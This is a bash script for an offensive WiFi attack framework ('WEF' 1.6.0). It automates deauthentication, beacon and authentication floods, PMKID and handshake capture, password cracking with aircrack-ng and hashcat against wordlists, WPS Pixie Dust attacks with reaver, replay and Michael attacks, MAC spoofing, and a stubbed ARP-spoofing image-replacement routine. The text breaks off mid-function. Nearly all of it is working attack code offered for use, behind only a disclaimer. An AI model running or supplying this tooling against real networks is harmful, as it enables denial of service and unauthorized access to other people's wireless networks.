#!/bin/bash

#--------------------------------
#
# D3Ext/WEF (WiFi Exploitation Framework)
# Twitter: @d3ext
# Website: https://d3ext.github.io/
# Mail: d3ext@protonmail.com
# Github: https://github.com/d3ext
#
# I'm not responsible of any bad usage of this tool
#
#--------------------------------

# Colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

# Ctrl + C
function ctrl_c(){
	echo -e "\n\n${blueColour}[${endColour}${yellowColour}!${endColour}${blueColour}] Exiting...\n${endColour}"
	rm ${dir}/*.tmp 2>/dev/null
	sleep 0.2
	tput cnorm
	exit 0
}

trap ctrl_c INT

# Ctrl +C v2
function ctrl_c2(){
	echo -e "\n\n${blueColour}[${endColour}${yellowColour}!${endColour}${blueColour}] Exiting...${endColour}\n"
	rm ${dir}/*.tmp 2>/dev/null
	rm ${dir}/rainbowtables 2>/dev/null
	rm ${dir}/wef-wordlist.txt 2>/dev/null
	rm ${dir}/pkmid_hashes 2>/dev/null
	rm ${dir}/pkmid_capture 2>/dev/null
	sleep 0.2
	tput cnorm
	exit 0
}

# Help Panel function
function helpPanel(){
	echo -e "${yellowColour} __      _____ ___ "
	echo -e " \ \    / / __| __|"
	echo -e "  \ \/\/ /| _|| _| "
	echo -e "   \_/\_/ |___|_|  ${endColour}"
	echo -e "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Wi-Fi Exploitation Framework${endColour} ${yellowColour}1.6.0${endColour}"
	echo -e "\n\t${yellowColour}-i)${endColour}${blueColour} The name of your interface (without \"mon\")${endColour}"
	echo -e "\t${yellowColour}-h)${endColour}${blueColour} Shows this help panel${endColour}\n"
}

# Banner1 Function
function banner1(){
echo -e "${yellowColour} █     █░▓█████   █████▒"
echo -e "▓█░ █ ░█░▓█   ▀ ▓██   ▒ "
echo -e "▒█░ █ ░█ ▒███   ▒████ ░ ${endColour} ${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] WiFi Exploitation Framework${endColour} ${yellowColour}1.6.0${endColour}"
echo -e "${yellowColour}░█░ █ ░█ ▒▓█  ▄ ░▓█▒  ░ "
echo -e "░░██▒██▓ ░▒████▒░▒█░    "
echo -e "░ ▓░▒ ▒  ░░ ▒░ ░ ▒ ░    "
echo -e "  ▒ ░ ░   ░ ░  ░ ░      "
echo -e "  ░   ░     ░    ░ ░    "
echo -e "    ░       ░  ░        "
echo -e "\n------------------------${endColour}"
}

# Banner2 Function
function banner2(){
echo -e "${yellowColour} █████   ███   █████ ██████████ ███████████"
echo -e "░░███   ░███  ░░███ ░░███░░░░░█░░███░░░░░░█"
echo -e " ░███   ░███   ░███  ░███  █ ░  ░███   █ ░ "
echo -e " ░███   ░███   ░███  ░██████    ░███████   ${endColour}${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] WiFi Exploitation Framework${endColour} ${yellowColour}1.6.0${endColour}"
echo -e "${yellowColour} ░░███  █████  ███   ░███░░█    ░███░░░█   "
echo -e "  ░░░█████░█████░    ░███ ░   █ ░███  ░    "
echo -e "    ░░███ ░░███      ██████████ █████      "
echo -e "     ░░░   ░░░      ░░░░░░░░░░ ░░░░░       "
echo -e "\n----------------------------------------${endColour}"
}

# Banner3 Function
function banner3(){
echo -e "${yellowColour}██╗    ██╗███████╗███████╗"
echo -e "██║    ██║██╔════╝██╔════╝               "
echo -e "██║ █╗ ██║█████╗  █████╗                 "
echo -e "██║███╗██║██╔══╝  ██╔══╝ ${endColour} ${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] WiFi Exploitation Framework ${endColour}${yellowColour}1.6.0${endColour}"
echo -e "${yellowColour}╚███╔███╔╝███████╗██║                    "
echo -e " ╚══╝╚══╝ ╚══════╝╚═╝     "
echo -e "\n------------------------${endColour}   "
}

# Banner Randomizer
function all_banners(){
	random_number=$(($RANDOM % 3 + 1))

	if [ "$random_number" == "1" ]; then
		banner1
	fi

	if [ "$random_number" == "2" ]; then
		banner2
	fi

	if [ "$random_number" == "3" ]; then
		banner3
	fi
}

# Dependencies Function
function dependencies(){
	programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm bettercap)
	system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
	if [ "$system"  == "Parrot" ]; then
		for program in "${programs[@]}"; do
			which $program &>/dev/null
			if [ "$(echo $?)" == "1" ]; then
				echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Requirements not installed${endColour}\n"
				echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Installing $program... ${endColour}"
				apt install "$program" -y &>/dev/null
			fi
		done
	fi

	if [ "$system"  == "Kali" ]; then
		for program in "${programs[@]}"; do
			which $program &>/dev/null
			if [ "$(echo $?)" == "1" ]; then
				echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Requirements not installed${endColour}\n"
				echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Installing $program... ${endColour}"
				apt install "$program" -y &>/dev/null
			fi
		done
	fi

	if [ "$system"  == "Arch" ]; then
		for program in "${programs[@]}"; do
			which $program &>/dev/null
			if [ "$(echo $?)" == "1" ]; then
				echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Requirements not installed${endColour}\n"
				echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Installing $program... ${endColour}"
				pacman -S "$program" --noconfirm &>/dev/null
			fi
		done
	fi

	if [ "$system"  == "Ubuntu" ]; then
		for program in "${programs[@]}"; do
			which $program  &>/dev/null
			if [ "$(echo $?)" == "1" ]; then
				echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Requirements not installed${endColour}\n"
				echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Installing $program... ${endColour}"
				apt install "$program" -y &>/dev/null
			fi
		done
	fi
}


# Functions Info
function functions_info(){
echo -e "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Tested with an ${endColour}${yellowColour}alfa AWUS036NHV${endColour}${blueColour} adapter${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}1${endColour}${blueColour}] Beacon Flood Attack:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] This attack create a lot of fake AP's that produce a DoS and kick the devices connected to the Access Points in your desired channel [${endColour}${yellowColour}WPA${endColour}${blueColour}]${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}2${endColour}${blueColour}] Deauthentication Attack:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] It's an attack based on sending specific deauthentication packets to an Access Point [${endColour}${yellowColour}WPA${endColour}${blueColour}]${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}3${endColour}${blueColour}] Authentication Attack:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] It's an attack in which you inject a lot of fake users to an Access Point [${endColour}${yellowColour}WEP${endColour}${blueColour}]${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}4${endColour}${blueColour}] PKMID Attack:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] It's an special attack, because it doesn't require clients connected to an Access Point [${endColour}${yellowColour}WPA${endColour}${blueColour}]${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}5${endColour}${blueColour}] Passive Attack:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] This attack keep listening and looking for handshakes when a user connect to the AP [${endColour}${yellowColour}WPA ${endColour}${blueColour}and${endColour}${yellowColour} WEP${endColour}${blueColour}]${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}6${endColour}${blueColour}] MAC Randomization:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] This function set a new random and fake mac address for your interface${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}7${endColour}${blueColour}] Start network card:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] This feature starts your network adapter in monitor mode for injecting packages${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}8${endColour}${blueColour}] Stop network card:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] As you think, this function turn your network adapter if it's in monitor mode into managed mode${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}9${endColour}${blueColour}] Attacks info:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] It displays this help panel about the availables functions${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}10${endColour}${blueColour}] Pixie Dust Attack:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] This attack try to exploit the WPS method [${endColour}${yellowColour}WPA${endColour}${blueColour}]${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}11${endColour}${blueColour}] Caffe Latte Attack:${endColour}"
sleep 0.1
echo -e "\t${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] It fakes the target AP to obtain the password [${endColour}${yellowColour}WEP${endColour}${blueColour}]${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}12${endColour}${blueColour}] Chopchop Attack:${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}13${endColour}${blueColour}] Michael Attack:${endColour}"
sleep 0.1
echo -e "\n${blueColour}[${endColour}${yellowColour}14${endColour}${blueColour}] Replay Attack:${endColour}"
}

# Exit Function
function keep_exit(){
	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to exit? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read exit_status

	if [ "$exit_status" == "y" ]; then
		ctrl_c
	fi

}

# Active Card
function active_card(){
	status_card=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
	if [ "$status_card" == "${netCard}mon" ]; then
		echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Your network card is: ${endColour}${greenColour}Active${endColour}"
	else
		echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Your network card is: ${endColour}${redColour}Inactive${endColour}"
	fi
}

# MAC Address Status
function mac_status(){
	if [ "$(ifconfig | grep "${netCard}" | awk '{print $1}' | tr -d ':')" == "${netCard}" ]; then
		actual_mac=$(ifconfig | grep "$netCard" -A 3 | tail -n 1 | awk '{print $2}')
		echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Your actual MAC address is: ${endColour}${greyColour}$actual_mac${endColour}"
	else
		echo -e "${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] MAC address not found${endColour}\n"
		exit 1
	fi
}


# MAC Address Changer
function mac_randomizer(){
	ifconfig ${netCard}mon down
	macchanger -a ${netCard}mon &>/dev/null
	ifconfig ${netCard}mon up
	sleep 0.3
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] MAC address randomized successfully${endColour}"
}

# Network Card Status
function card_status(){
	test -d "/sys/class/net/${netCard}"
	if [ "$(echo $?)" == "0" ]; then
		echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Your network interface is: ${endColour}${greyColour}$netCard${endColour}"
	else
		echo -e "${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Network interface not found${endColour}"
	fi
}

# Network Card Start
function card_setup(){
	airmon-ng start $netCard &>/dev/null
	ifconfig ${netCard}mon up
	killall dhclient wpa_supplicant 2>/dev/null
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Network card configured successfully${endColour}\n"
	sleep 2.5
}

# Network Card Stop
function card_stop(){
	airmon-ng stop ${netCard} &>/dev/null
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Network card stoped${endColour}\n"
	sleep 2.5
}

# Channel and ESSID Function
function ask_data1(){
	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Name of your target AP: ${endColour}" && read name
	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Number of the channel: ${endColour}" && read channel
}

# Only Channel Function
function ask_data2(){
	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Name of the target AP: ${endColour}" && read name
}

# Target MAC Function
function ask_mac(){
	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] MAC address of the AP: ${endColour}" && read ap_mac
}

# Time Function
function ask_time(){
	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Duration of the attack: ${endColour}" && read attack_time
}

# Wordlist Function
function ask_dict(){
	echo -e "\n${blueColour}[${endColour}${redColour}!${endColour}${blueColour}] You need to have seclists installed${endColour}"
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Wordlists availables:${endColour}\n"
	echo -e "\t${blueColour}[${endColour}${yellowColour}1${endColour}${blueColour}] rockyou.txt${endColour}"
	echo -e "\t${blueColour}[${endColour}${yellowColour}2${endColour}${blueColour}] probable-v2-wpa-top4800.txt${endColour}"
	echo -e "\t${blueColour}[${endColour}${yellowColour}3${endColour}${blueColour}] darkweb2017-top10000.txt${endColour}"
	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please, select a wordlist to use: ${endColour}" && read dic_option

	if [ "$dic_option" == "1" ]; then
		wordlist_to_use="/opt/WEF/main//wordlists/rockyou.txt"
	fi

	if [ "$dic_option" == "2" ]; then
		wordlist_to_use="/opt/WEF/main/wordlists/probable-v2-wpa-top4800.txt"
	fi

	if [ "$dic_option" == "3" ]; then
		wordlist_to_use="/opt/WEF/main/wordlists/darkweb2017-top10000.txt"
	fi

	if [ "$dic_option" == "kaonashi" ]; then
		wordlist_to_use="/opt/WEF/main/wordlists/kaonashi.txt"
	fi
}

# Show the values
function essid_channel(){
	if [ "name" ]; then
		if [ "channel" ]; then
			echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] The name of the target is: ${endColour}${greyColour}$name${endColour}"
			echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] The number of the channel is: ${endColour}${greyColour}$channel${endColour}"
		fi
	fi
}

# Handshake Cracking
function handshake_crack(){
	test -f Capture-01.cap
	if [ "$(echo $?)" == "0" ]; then
		echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting handshake cracking...${endColour}\n"
		sleep 0.4
		ask_dict
		sleep 0.3
		rainbow-gen
		sleep 2.5
		aircrack-ng -r ${dir}/rainbowtables ${dir}/Capture-01.pcap
		sleep 0.3
		echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Cracking process completed${endColour}"
		sleep 2
		keep_exit
	else
		echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Handshakes file not found${endColour}\n"
		exit 0
	fi
}

# Rainbow Table Generate
function rainbow-gen(){
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Creating rainbow tables...${endColour}"
	head -n 1000000 ${wordlist_to_use} > ${dir}/wef-wordlist.txt 2>/dev/null
	echo -e "${name}" > ${dir}/essid.tmp 2>/dev/null
	airolib-ng ${dir}/rainbowtables --import passwd ${dir}/wef-wordlist.txt &>/dev/null
	airolib-ng ${dir}/rainbowtables --import essid ${dir}/essid.tmp &>/dev/null
	timeout 90 bash -c "airolib-ng ${dir}/rainbowtables --batch"
	echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Rainbow tables created successfully${endColour}"
}

# Report Generate Function
function report-gen(){
	touch /opt/WEF/main/captures/$name/log.txt

	if [ ! "$name" ]; then
		name="Not especified"
	fi

	if [ ! "$channel" ]; then
		channel="Not especified"
	fi

	if [ ! "$attack_time" ]; then
		attack_time="Not especified"
	fi

	echo -e "[WEF] WiFi Exploitation Framework" > /opt/WEF/main/captures/$name/log.txt
	echo -e "---------------------------------" >> /opt/WEF/main/captures/$name/log.txt
	echo -e "Date of the attack: $actual_date" >> /opt/WEF/main/captures/$name/log.txt
	echo -e "Type of attack selected: $type_of_attack" >> /opt/WEF/main/captures/$name/log.txt
	echo -e "Attack completed against: $name" >> /opt/WEF/main/captures/$name/log.txt
	echo -e "Duration of the attack: $attack_time" >> /opt/WEF/main/captures/$name/log.txt
	echo -e "Channel of the AP: $channel" >> /opt/WEF/main/captures/$name/log.txt
	echo -e "---------------------------------" >> /opt/WEF/main/captures/$name/log.txt
}

# Deauthentication Attack
function deauth_attack(){
	clear
	banner1
	sleep 1
	xterm -hold -e "airodump-ng ${netCard}mon" &
	air_PID=$!
	ask_data1
	ask_time
	kill -9 $air_PID
	wait $air_PID 2>/dev/null

	sleep 1.3
	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon" &
	air2_PID=$!

	sleep 2.5
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Deauthentication attack...${endColour}"
	aireplay-ng -0 10 -e $name -c FF:FF:FF:FF:FF:FF ${netCard}mon &>/dev/null

	kill -9 $air2_PID
	wait $air2_PID 2>/dev/null

	mkdir /opt/WEF/main/captures/$name
	cp Capture-* /opt/WEF/main/captures/$name/
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
	sleep 0.1
	report-gen
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.3
	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to crack the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read crack_option
	sleep 0.2

	if [ "$crack_option" == "y" ]; then
		handshake_crack
	else
		ctrl_c
	fi
}

# PKMID Cracking
function pkmid_crack(){
	test -f pkmid_hashes
	if [ "$(echo $?)" == "0" ]; then
		echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting PKMID handshake cracking...${endColour}\n"
		sleep 0.4
		ask_dict
		sleep 0.4
		hashcat -m 16800 "${wordlist_to_use}" ${dir}/pkmid_hashes -d 1 --force 2>/dev/null
		sleep 0.3
		echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Cracking process completed${endColour}"
		sleep 1
		keep_exit
	else
		echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Handshakes file not found${endColour}\n"
		ctrl_c
	fi
}

# Auth Attack
function auth_attack(){
	clear
	banner2
	sleep 1
	xterm -hold -e "airodump-ng ${netCard}mon" &
	air_PID=$!

	ask_data1
	ask_time

	mkdir /opt/WEF/main/captures/$name 2>/dev/null
	kill -9 $air_PID
	wait $air_PID 2>/dev/null

	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon" &
	air2_PID=$!

	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Authentication attack...${endColour}"
	xterm -hold -e "mdk4 -a" &
	aireplay_PID=$!
	sleep "${attack_time}"
	kill -9 ${aireplay_PID}; wait ${aireplay_PID} 2>/dev/null
	sleep 0.1
	kill -9 $air2_PID; wait $air2_PID 2>/dev/null
	report-gen
	cp Capture-* /opt/WEF/main/captures/$name/
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.1
	echo -e "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
	sleep 1.5
	keep_exit
}

# Beacon Attack
function beacon_flood(){
	clear
	banner3
	sleep 1
	xterm -hold -e "airodump-ng ${netCard}mon" &
	air_PID=$!

	ask_data1
	ask_time

	mkdir /opt/WEF/main/captures/$name
	kill -9 $air_PID
	wait $air_PID 2>/dev/null

	sleep 0.3
	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Beacon Flood attack...${endColour}"
	sleep 1
	timeout ${attack_time} bash -c "mdk4 ${netCard}mon b -c ${channel}"
	sleep 0.3

	report-gen
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.1
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Beacon Flood attack completed${endColour}"
	sleep 1.5
	keep_exit
}

# PKMID Attack
function pkmid_attack(){
	clear
	banner1
	sleep 0.3
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting PKMID attack${endColour}"
	sleep 1
	ask_data2
	mkdir /opt/WEF/main/captures/$name 2>/dev/null
	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	timeout 120 bash -c "hcxdumptool -i ${netCard}mon --enable_status=1 -o pkmid_capture"
	sleep 1
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Obtaining hashes...${endColour}"
	sleep 1.3

	cp ${dir}/pkmid_capture /opt/WEF/main/captures/$name/ 2>/dev/null
	hcxpcaptool -z ${dir}/pkmid_hashes ${dir}/pkmid_capture; rm ${dir}/pkmid_capture 2>/dev/null
	cp ${dir}/pkmid_hashes /opt/WEF/main/captures/$name/ 2>/dev/null
	report-gen

	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.1
	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to crack the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read crack_option
	if [ "${crack_option}" == "y" ]; then
		pkmid_crack
	else
		ctrl_c
	fi
}

# Pasive Attack Function
function passive_attack(){
	clear
	banner2
	sleep 0.3
	xterm -hold -e "airodump-ng ${netCard}mon" &
	passive_PID=$!
	ask_data1
	ask_time
	kill -9 $passive_PID
	wait $passive_PID 2>/dev/null

	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Pasive/Stealthy attack...${endColour}"
	sleep 1.3
	xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon" &
	passive2_PID=$!

	sleep "${attack_time}"

	kill -9 $passive2_PID
	wait $passive2_PID 2>/dev/null

	mkdir /opt/WEF/main/captures/$name
	cp Capture-* /opt/WEF/main/captures/$name/
	report-gen
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.1
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Passive attack completed${endColour}"
	sleep 1.5
	keep_exit
}

# Michael Exploitation Attack
function michael(){
	clear
	banner3
	sleep 0.3
	xterm -hold -e "airodump-ng ${netCard}mon" &
	air_PID=$!

	ask_data2
	ask_mac
	ask_time

	mkdir /opt/WEF/main/captures/$name 2>/dev/null
	kill -9 $air_PID; wait $air_PID 2>/dev/null
	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	timeout "${attack_time}" bash -c "mdk4 m -t ${ap_mac}"
	report-gen
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.1
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attacked completed${endColour}"
	sleep 1.5
	keep_exit
}

# WPS Bruteforce Attack
function pixie_dust(){
	clear
	banner1
	sleep 0.3
	xterm -hold -e "airodump-ng ${netCard}mon" &
	air_PID=$!
	ask_mac
	ask_data2
	kill -9 $air_PID; wait $air_PID 2>/dev/null
	sleep 0.3
	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Pixie Dust attack...${endColour}"
	sleep 0.3
	reaver -i ${netCard}mon -b ${ap_mac} -vv -K 1
	sleep 0.3

	mkdir /opt/WEF/main/captures/$name
	report-gen
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.1
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attacked completed${endColour}"
	sleep 1.5
	keep_exit
}

# Caffe-Latte Attack
function caffe-latte(){
	echo
}

# Chopchop Attack
function chopchop(){
	echo
}

# Replay Attack
function replay(){
	clear
	banner1
	sleep 0.15
	xterm -hold -e "airodump-ng ${netCard}mon" &
	air_PID=$!
	sleep 0.1

	ask_data1
	ask_mac
	ask_time

	kill -9 $air_PID; wait $air_PID 2>/dev/null

	sleep 0.3
	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Speed of the attack:${endColour}"
	sleep 0.1
	echo -e "${blueColour}[${endColour}${yellowColour}1${endColour}${blueColour}] Fast${endColour}"
	sleep 0.1
	echo -e "${blueColour}[${endColour}${yellowColour}2${endColour}${blueColour}] Normal${endColour}"
	sleep 0.1
	echo -ne "${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Select an option [default: normal]: ${endColour}" && read speed_option

	if [ "$speed_option" == "1" ]; then
		sleep 0.1
		echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Increasing the amount of IV's...${endColour}"
		timeout 60 bash -c "aireplay-ng -1 0 -e ${name} -a ${ap_mac} ${netCard}mon &>/dev/null"
	fi

	sleep 0.1
	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting replay attack...${endColour}"
	sleep 2.5
	xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon"
	air2_PID=$!
	sleep 1

	timeout ${attack_time} bash -c "aireplay-ng -3 -b ${ap_mac} ${netCard}mon &>/dev/null"

	sleep 2
	kill -9 $air2_PID; wait $air2_PID 2>/dev/null

	sleep 1
	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
	sleep 0.1
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attacked completed${endColour}"
	sleep 1.5
	keep_exit
}

# Host Discover Function
function scan(){
        echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Enter the host to scan: ${endColour}" && read host_ip
        final_ip=$(echo "$host_ip" | awk '{print $1 "." $2 "." $3}' FS=".")
        echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Active hosts list:${endColour}"
        echo -e ""
        sleep 0.3
        for number in $(seq 1 254); do
                timeout 1 bash -c "ping -c 1 $final_ip.$number &>/dev/null" && echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] $final_ip.$number \t- ${endColour}${yellowColour}Active${endColour}" &
        done
        sleep 0.3
	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Scan completed${endColour}"
}

# Image Changer Attack
function image_changer(){
	clear
	sleep 0.1
	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you to scan the network? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read option
	if [ "$option" == "y" ]; then
		scan
	fi
	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Enter the target ip: ${endColour}" && read target_ip
	cp /opt/WEF/main/modules/replace_images.rb .

	# bettercap -I ${interface} -O bettercap_proxy.log -S ARP -X --proxy --proxy-module replace_images --httpd --httpd-path img --gateway 192.168.0.1 --target 192.168.0.7

	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack Completed${endColour}"
	rm ${dir}/replace_images.rb 2>/dev/null
	sleep 1.5
	keep_exit
}

# Command Execution Mode
function exec_commands(){
	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Entering command mode${endColour}\n"
	tput cnorm
	while true; do

		echo -ne "$(whoami):$(pwd): " && read your_command

		if [ "$your_command" != "exit" ]; then
			echo -e "${blueColour}"
			${your_command}
			echo -e "${endColour}"
		else
			tput civis
			break
			sleep 0.3
		fi
	done

}


# Secret
function secret(){
echo -e "\n${yellowColour}"
echo -e "    @@                             @@     "
echo -e "  @@   @@.                     .@@   @@   "
echo -e " @@   @@  @@@               @@@  @@   @@  "
